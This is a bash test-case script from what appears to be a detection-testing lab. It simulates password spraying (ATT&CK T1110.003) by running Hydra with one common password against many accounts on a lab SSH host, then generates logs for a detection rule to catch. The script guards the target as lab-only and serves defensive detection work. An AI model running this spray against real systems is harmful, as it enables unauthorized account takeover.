#!/usr/bin/env bash
# TC-02  T1110.003  Password spraying  (Hydra -> Linux SSH host)
# Few attempts per account spread across many accounts from one source.
# Expected: low_attempts_across_many_accounts_from_single_source.
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../lib" && pwd)/common.sh"

resolve_run_dir "${1:-}"
load_tc TC-02
log "TC-02 password spray -> ${TC_DST}:${TC_DPORT}"

if real_tools_enabled; then
  assert_lab_target "$TC_DST"
  if have_tool hydra; then
    log "running Hydra password spray against lab SSH host"
    ROSTER="$ATTACKER_ROOT/targets/ssh_host/accounts.txt"
    USERFILE="$(mktemp)"; grep -v '^#' "$ROSTER" | cut -d: -f1 > "$USERFILE"
    # One common password, many accounts = spray.
    hydra -L "$USERFILE" -p "Password1" -t 2 \
      "ssh://${TC_DST}:${TC_DPORT}" 2>>"$RUN_DIR/_tools.log" || true
    rm -f "$USERFILE"
  else
    warn "hydra not installed; emitting normalized logs only"
  fi
fi

generate_logs TC-02
